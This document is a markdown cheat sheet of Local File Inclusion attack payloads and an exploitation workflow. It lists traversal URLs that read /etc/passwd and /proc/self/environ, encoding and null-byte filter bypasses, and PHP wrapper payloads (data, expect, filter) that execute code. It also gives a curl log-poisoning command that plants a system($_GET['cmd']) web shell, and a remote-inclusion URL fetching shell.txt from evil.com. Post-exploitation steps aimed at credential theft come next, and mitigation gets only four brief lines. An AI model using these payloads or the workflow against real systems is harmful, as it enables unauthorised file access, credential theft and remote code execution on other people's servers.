# Structured Breakdown of LFI Payloads

1. **PHP Wrappers (zip)**
   - Include files from within a ZIP archive.
   ```
   http://example.com/index.php?page=zip://payload.zip%23payload.php
   ```

2. **Basic Path Traversal**
   - This technique involves using `../` sequences to traverse up the directory structure.
   ```
   http://example.com/index.php?page=../../../../etc/passwd
   ```

3. **Double Encoding**
   - Double URL encode the traversal characters to obfuscate the payload further.
   ```
   http://example.com/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd
   ```

4. **PHP Wrappers (filter)**
   - Use PHPâ€™s `filter` wrapper to manipulate how files are read.
   ```
   http://example.com/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
   ```

5. **URL Encoding**
   - Encode the traversal characters to bypass filters that block `../`.
   ```
   http://example.com/index.php?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd
   ```

6. **Path Truncation**
   - Use excessively long paths to force truncation that can bypass checks.
   ```
   http://example.com/index.php?page=../../../../../../../../../../etc/passwd/././././.
   ```

7. **Null Byte Injection**
   - Use a null byte (`%00`) to terminate the string early, potentially bypassing file extension checks.
   ```
   http://example.com/index.php?page=../../../../etc/passwd%00
   ```

8. **UTF-8 Encoding**
   - Encode using UTF-8 to evade filters.
   ```
   http://example.com/index.php?page=%c0%ae%c0%ae%c0%ae%c0%ae/etc/passwd
   ```

9. **Existing Folder Traversal**
   - Exploit by navigating through existing folders in the web directory structure.
   ```
   http://example.com/index.php?page=scripts/../../../../etc/passwd
   ```

10. **Including `/proc` Files**
    - Exploit the `/proc` filesystem to gather sensitive information.
    ```
    http://example.com/index.php?page=/proc/self/environ
    ```

11. **Remote File Inclusion (RFI)** (when enabled)
    - This occurs if the server allows inclusion of files from external URLs. Though primarily an RFI attack, if misconfigured, it can overlap with LFI.
    ```
    http://example.com/index.php?page=http://evil.com/shell.txt
    ```

12. **Log File Poisoning**
    - Inject PHP code into server logs, then include the log file.
    ```
    # Injecting into the User-Agent header:
    curl -A "<?php system($_GET['cmd']); ?>" "http://example.com/"
    # Accessing the log file:
    http://example.com/index.php?page=/var/log/apache2/access.log
    ```

13. **Data Wrapper**
    - Use the `data` wrapper to embed and execute PHP code.
    ```
    http://example.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
    ```

14. **Expect Wrapper**
    - The `expect` wrapper can be used to run shell commands directly if enabled.
    ```
    http://example.com/index.php?page=expect://ls
    ```

# Practical Steps for LFI Exploitation

1. **Discovery**:
   - Use tools like Burp Suite, DirBuster, or gobuster to discover possible LFI entry points.

2. **Initial Testing**:
   - Inject basic traversal sequences to see if the server responds with different content indicating directory traversal.

3. **Advanced Bypass**:
   - Try the various encoding methods or combined approaches to bypass filters.

4. **Gaining More Access**:
   - Once basic file access is achieved, escalate by including files like `/etc/passwd` and server configuration files or using log file poisoning to execute code.

5. **Post-Exploitation**:
   - Use included files to gather credentials, understand server configurations, or execute commands if code execution is possible.

# Mitigation

- Validate and sanitize all user inputs rigorously.
- Implement proper file inclusion checks and disable unnecessary PHP wrappers.
- Use whitelisting to control which files can be included.
- Ensure server error messages do not reveal directory structures or sensitive paths.

# Next Steps

- Consider how these techniques can be applied in different web application environments or CMS platforms.
- Explore the interaction between LFI and other vulnerabilities like SQL Injection for combined exploitation strategies.
